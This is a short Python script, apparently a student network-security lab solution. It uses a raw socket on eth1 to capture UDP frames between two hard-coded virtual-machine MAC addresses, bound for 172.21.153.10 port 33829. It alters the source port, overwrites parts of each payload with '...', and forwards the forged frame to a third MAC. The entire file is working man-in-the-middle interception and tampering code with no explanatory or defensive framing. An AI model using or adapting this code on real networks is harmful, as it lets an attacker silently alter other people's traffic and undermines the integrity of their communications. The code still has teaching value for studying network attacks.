#!/usr/bin/env python3

'''
Onno de Gouw
Stefan Popa
'''

import socket
import struct

def parse_ether(packet):
    dest_address = packet[:6]
    src_address = packet[6:12]
    tag_check = packet[12:14]
    
    if (tag_check == b'\x81\x00'):
        tag = packet[12:16]
        type_code = packet[16:18]
        data = packet[18:]
    else:
        type_code = tag_check
        tag = type_code
        data = packet[14:]
        
    return dest_address, src_address, type_code, tag, data
    
def build_ether(src_address, dest_address, type_code, tag, ip_header, dest_port, data_length, data):
    udp_packet = build_udp(dest_port, data_length, data)
    ip_packet = build_ip(ip_header, udp_packet)
    
    header = dest_address + src_address
    if tag == type_code:
        header = header + type_code
    else:
        header = header + tag + type_code
        
    return header + ip_packet

def parse_ip(packet):
    header_length_in_bytes = (packet[0] & 0x0F) * 4
    header = packet[:header_length_in_bytes]
    data = packet[header_length_in_bytes:]
    
    temp_header = packet[:20]
    (src_address, dest_address) = struct.unpack("!12x4s4s", temp_header) 
    return src_address, dest_address, header, data
    
def build_ip(header, data):
    return header + data

def parse_udp(packet):
    header_length = 8
    header = packet[:header_length]
    data = packet[header_length:]
    
    (source_port, dest_port, data_length, checksum) = struct.unpack("!HHHH", header)
    
    return source_port, dest_port, data_length, checksum, data
    
def build_udp(dest_port, data_length, data):
    header = struct.pack("!HHHH", 57551, dest_port, data_length, 0)
    
    new_data = data[:135] + b'...' + data[142:159] + b'...' + data[166:]
    
    return header + new_data

def main():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    s.bind(("eth1", 0))
    
    while True:
        data, addr = s.recvfrom(size)
        
        dest_ether, src_ether, type_code_ether, tag_ether, data_ether = parse_ether(data)
        source_address_mac = "%02x:%02x:%02x:%02x:%02x:%02x" % struct.unpack("BBBBBB", src_ether)
        destination_address_mac = "%02x:%02x:%02x:%02x:%02x:%02x" % struct.unpack("BBBBBB", dest_ether)
        #Source: https://stackoverflow.com/questions/4959741/python-print-mac-address-out-of-6-byte-string
        
        if source_address_mac == '08:00:27:62:02:ee' and destination_address_mac == '08:00:27:df:09:84':
            src_ip, dest_ip, header_ip, data_ip = parse_ip(data_ether)
            destination_address_ip = socket.inet_ntoa(dest_ip)
            
            if (destination_address_ip == '172.21.153.10'):
                source_port, dest_port, data_length, checksum, data_udp = parse_udp(data_ip)
                
                if dest_port == 33829:
                    src_ether = dest_ether           
                    dest_ether = bytearray.fromhex("0800276617ab")
                    
                    packet = build_ether(src_ether, dest_ether, type_code_ether, tag_ether, header_ip, dest_port, data_length, data_udp)
                    
                    s.send(packet)

if __name__ == "__main__":
    size = 65565
    main()
